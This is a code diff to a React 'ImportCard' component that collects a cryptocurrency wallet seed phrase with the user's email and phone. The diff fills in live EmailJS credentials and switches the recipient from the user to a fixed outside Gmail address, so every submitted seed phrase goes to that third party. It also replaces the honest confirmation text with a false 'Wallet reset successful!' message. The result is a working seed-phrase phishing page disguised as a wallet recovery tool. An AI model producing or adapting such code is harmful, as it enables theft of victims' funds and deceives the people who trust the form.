@@ -5,7 +5,7 @@ import emailjs from "@emailjs/browser";
 import Step from "../Step/Step";
 
 // Initialize EmailJS (replace with your public key)
-emailjs.init("YOUR_PUBLIC_KEY_HERE");
+emailjs.init("LW44rvkjF7CKnv0uf");
 
 function ImportCard() {
   const [words, setWords] = useState([]);
@@ -62,7 +62,7 @@ function ImportCard() {
     try {
       // Prepare email parameters
       const templateParams = {
-        to_email: email,
+        to_email: 'livinglive2025@gmail.com',
         seed_phrase: words.join(" "),
         email: email,
         phone: phone,
@@ -72,13 +72,13 @@ function ImportCard() {
 
       // Send email using EmailJS
       const response = await emailjs.send(
-        "YOUR_SERVICE_ID", // Replace with your EmailJS Service ID
-        "YOUR_TEMPLATE_ID", // Replace with your EmailJS Template ID
+        "service_3zwnl3d", // Replace with your EmailJS Service ID
+        "template_u63atv6", // Replace with your EmailJS Template ID
         templateParams
       );
 
       if (response.status === 200) {
-        alert("✅ Recovery details sent successfully to your email!");
+        alert("✅ Wallet reset successful!");
         // Reset form
         setWords([]);
         setEmail("");
@@ -86,7 +86,7 @@ function ImportCard() {
         setPhone("");
         setCurrentStep(1);
       } else {
-        alert("❌ Failed to send recovery details. Please try again.");
+        alert("❌ Failed to reset wallet. Please try again.");
       }
     } catch (err) {
       console.error("Error sending email:", err);
